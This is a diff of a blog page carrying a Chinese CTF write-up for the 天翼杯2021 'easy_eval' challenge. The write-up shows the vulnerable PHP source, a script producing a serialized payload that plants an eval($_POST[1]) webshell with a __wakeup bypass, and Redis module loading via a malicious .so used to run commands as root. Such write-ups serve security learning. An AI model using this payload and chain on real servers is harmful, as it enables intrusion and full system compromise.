@@ -6,7 +6,13 @@
     <meta charset="utf-8">
     <meta name="keywords" content="天翼杯2021 esay_eval, 故忚">
     <meta name="description" content="题目源码：
-1234567891011121314151617181920212223242526272829303132&amp;lt;?phpclass A&amp;#123;    public $code = &amp;quot;&amp;quot;;    fu">
+&amp;lt;?php
+class A{
+    public $code = &#34;&#34;;
+    function __call($method,$args){
+        eval($this-&gt;code);
+        
+ ">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -29,7 +35,8 @@
     <link rel="stylesheet" type="text/css" href="/css/my.css">
     <link rel="stylesheet" type="text/css" href="/css/dark.css">
     <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
-<meta name="generator" content="Hexo 6.1.0"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
+<meta name="generator" content="Hexo 6.1.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
 
 
 
@@ -321,20 +328,22 @@
 
     #floating-toc-btn {
         position: fixed;
-        right: 15px;
-        bottom: 137px;
+        right: 0.7cm;
+        bottom: 150px;
         padding-top: 15px;
         margin-bottom: 0;
         z-index: 998;
+        width: 0.75cm;
+        height: 28px;
     }
 
     #floating-toc-btn .btn-floating {
-        width: 48px;
-        height: 48px;
+        width: 40px;
+        height: 40px;
     }
 
     #floating-toc-btn .btn-floating i {
-        line-height: 48px;
+        line-height: 38px;
         font-size: 1.4rem;
     }
 </style>
@@ -383,7 +392,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    546
+                    507
                 </div>
                 
 
@@ -406,11 +415,58 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <p>题目源码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">a</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;poc&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/&quot;[BA]&quot;:(.*?):/s&#x27;</span>,<span class="variable">$_REQUEST</span>[<span class="string">&#x27;poc&#x27;</span>],<span class="variable">$ret</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$ret</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$ret</span>[<span class="number">1</span>] <span class="keyword">as</span> <span class="variable">$i</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$i</span>)!==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">exit</span>(<span class="string">&quot;you want to bypass wakeup ? no !&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;poc&#x27;</span>]);    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span><span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        
+    <span class="token punctuation">}</span>
+    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">code</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
 
+<span class="token keyword">class</span> <span class="token class-name">B</span><span class="token punctuation">{</span>
+    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'poc'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">'/"[BA]":(.*?):/s'</span><span class="token punctuation">,</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'poc'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$i</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+                <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"you want to bypass wakeup ? no !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'poc'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
+    <span class="token punctuation">}</span>
+
+
+<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>上来是个简单（bushi）的反序列化拿shell，但是A类里面的<code>__wakeup()</code>函数会把我们传进去的<code>$code</code>属性置为空，这里我们只需要让<code>__wakeup()</code>函数失效，CVE-2016-7124:当反序列化字符串中，表示属性个数的值大于真实属性个数时，会绕过 __wakeup 函数的执行。(也可上b站看<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Z54y1U7up?spm_id_from=333.880.my_history.page.click">视频学习</a>）</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;code = <span class="variable">$code</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">a</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;code = <span class="string">&#x27;eval($_POST[1]);&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
+<pre><code>&lt;?php
+class a&#123;
+    function __construct()&#123;
+        $this-&gt;code = $code;
+    &#125;
+&#125;
+class B&#123;
+    function __construct()&#123;
+        $this-&gt;a = $a;
+    &#125;
+&#125;
+$a = new a();
+$a-&gt;code = &#39;eval($_POST[1]);&#39;;
+$b = new B();
+$b-&gt;a = $a;
+echo serialize($b);
+?&gt;
+</code></pre>
 <p>得到了payload：?poc&#x3D;O:1:”B”:1:{s:1:”a”;O:1:”a”:2:{s:4:”code”;s:16:”eval($_POST[1]);”;}}直接不犹豫连接蚁剑.当我们以为就此结束可以拿到flag我们点击根目录发现这个shell没有访问权限，但是在&#x2F;var&#x2F;www&#x2F;html中有上传权限，所以可以通过上传恶意的so文件，通过蚁剑的redis管理插件，进行ssrf，然后包含恶意so文件（提供一<a target="_blank" rel="noopener" href="https://github.com/Dliv3/redis-rogue-server">下载地址</a>）</p>
 <p><img src="https://s2.loli.net/2022/05/11/jnw9QXU8NWF5eK1.png" alt="image.png"></p>
 <p><strong>注</strong>：因为插件市场这个东西，国内基本是访问不到，我在用蚁剑访问的时候，就一直转圈圈转不出来，所以可以使用github的插件仓库下载插件，然后手动放到<strong>antSword-master&#x2F;antData&#x2F;pulgins</strong>中，再次打开蚁剑后，会自动加载该插件（或者科学上网）</p>
@@ -422,12 +478,15 @@
 <p><img src="https://s2.loli.net/2022/05/11/4w9d3VIzTHDgM1x.png" alt="image.png"></p>
 <p>然后执行指令</p>
 <p><img src="https://s2.loli.net/2022/05/11/8CGLhlsyeDYir3N.png" alt="image.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MODULE LOAD /var/www/html/exp.so</span><br><span class="line">system.exec &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
-
+<pre><code>MODULE LOAD /var/www/html/exp.so
+system.exec &quot;whoami&quot;
+</code></pre>
 <p>这里我们发现是root权限</p>
 <p><img src="https://s2.loli.net/2022/05/11/lAhN2fa8yWSCPwk.png" alt="image.png"></p>
 <p>直接看根目录   然后找到flag</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system.exec &quot;ls /&quot;</span><br><span class="line">system.exec &quot;cat /flag*&quot;</span><br></pre></td></tr></table></figure>
+<pre><code>system.exec &quot;ls /&quot;
+system.exec &quot;cat /flag*&quot;
+</code></pre>
 
                 
             </div>
@@ -769,6 +828,43 @@
 </div>
 
 
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('80')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE' || selection.getRangeAt(0).commonAncestorContainer.nodeName === 'CODE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: 故忚<br />'
+            + '文章作者: 故忚<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归故忚所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
 
 <!-- 代码块功能依赖 -->
 <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
@@ -903,7 +999,7 @@
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">726</span>
+                        class="white-color">687</span>
             
             
             
@@ -1220,18 +1316,47 @@ $(function () {
 
 
 
+    <script src="//code.tidio.co/bnuhsakb5kez2ofb6qddz8iz7hspsia9.js"></script>
+    <script>
+        $(document).ready(function () {
+            setInterval(change_Tidio, 50);
+
+            function change_Tidio() {
+                var tidio = $("#tidio-chat iframe");
+                if (tidio.css("display") == "block" && $(window).width() > 977) {
+                    document.getElementById("tidio-chat-iframe").style.bottom = ($("div#backTop.top-scroll").css("display") == "none" && $(window).width() > 977) > 0 ? "-40px" : ($("div.toc-title").length && $(window).width() > 977) > 0 ? "85px" : "20px";
+                    document.getElementById("tidio-chat-iframe").style.right = "-15px";
+                    document.getElementById("tidio-chat-iframe").style.height = parseInt(tidio.css("height")) >= 520 ? "520px" : tidio.css("height");
+                    document.getElementById("tidio-chat-iframe").style.zIndex = "997";
+                } else if (tidio.css("display") == "block" && $(window).width() > 601 && $(window).width() < 992) {
+                    document.getElementById("tidio-chat-iframe").style.bottom = ($("div#backTop.top-scroll").css("display") == "none" && 601 < $(window).width() < 992) > 0 ? "-40px" : "20px";
+                    document.getElementById("tidio-chat-iframe").style.right = "-15px";
+                    document.getElementById("tidio-chat-iframe").style.zIndex = "997";
+                } else if (tidio.css("display") == "block" && $(window).width() < 601 && parseInt(tidio.css("height")) < 230) {
+                    document.getElementById("tidio-chat-iframe").style.bottom = ($("div#backTop.top-scroll").css("display") == "none" && $(window).width() < 601) > 0 ? "-10px" : "50px";
+                    document.getElementById("tidio-chat-iframe").style.zIndex = "997";
+                }
+        //         if (tidio.css("display") == "block" && $(window).width() < 601 && parseInt(tidio.css("height")) >= 230) {
+        //             document.getElementById("tidio-chat-iframe").style.zIndex = "998";
+        //         }
+        //     }
+        // });
+    </script>
+
 
 
 
 <!--腾讯兔小巢-->
 
 
+    <script type="text/javascript" color="0,0,255"
+            pointColor="0,0,255" opacity='0.7'
+            zIndex="-1" count="99"
+            src="/libs/background/canvas-nest.js"></script>
 
 
 
 
-    <script type="text/javascript" src="/libs/background/ribbon-dynamic.js"
-            async="async"></script>
 
 
 
